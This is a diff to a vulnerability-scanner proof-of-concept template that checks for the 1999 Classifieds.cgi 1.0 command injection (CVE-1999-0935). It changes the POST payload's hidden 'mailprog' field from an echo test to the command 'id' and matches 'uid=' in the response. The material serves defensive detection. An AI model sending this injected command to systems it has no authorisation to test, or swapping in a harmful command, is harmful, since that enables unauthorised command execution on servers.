@@ -1,9 +1,9 @@
 [info]
 author = "ave"
-description = "检测 Classifieds.cgi 1.0 是否对 mailprog 隐藏变量缺乏过滤。发送 POST 请求将 mailprog 设为恶意命令，若脚本执行该命令则存在漏洞。"
+description = "验证目标是否存在 Classifieds.cgi 1.0 隐藏变量命令注入漏洞。向 /cgi-bin/classifieds.cgi 发送特制 POST 请求，将 mailprog 参数覆写为无害探测命令（id），若响应体中出现 uid= 输出则表明目标存在该漏洞，攻击者可在该参数中注入任意系统命令。"
 id = "POC-AVE-1999-1314"
-name = "Greg Matthews Classifieds.cgi 1.0 远程命令注入 PoC"
-severity = "critical"
+name = "Classifieds.cgi 1.0 Hidden Variable Command Injection PoC"
+severity = "high"
 tags = ["ave-1999-1314"]
 vuln_id = [
     "CVE-1999-0935",
@@ -11,22 +11,25 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/classifieds.cgi"
+path = "/cgi-bin/classifieds.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "ClassifiedsDir=/home/httpd/html/class/ads/&ViewDir=http://victim.com/class/ads/&ErrorReturn=http://victim.com/class/index.html&ReturnURL=http://victim.com/class/hi.html&return=test@test.com&mailprog=echo%20AVE_TEST"
-type = "raw"
+content = "ClassifiedsDir=/tmp/ads/&ViewDir=http://{{Hostname}}/ads/&ErrorReturn=http://{{Hostname}}/&ReturnURL=http://{{Hostname}}/&return=test@test.com&mailprog=id"
+type = "form"
 
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
+[[poc.requests.matchers]]
+expect = true
+part = ""
+status = [200]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["AVE_TEST"]
+words = ["uid="]
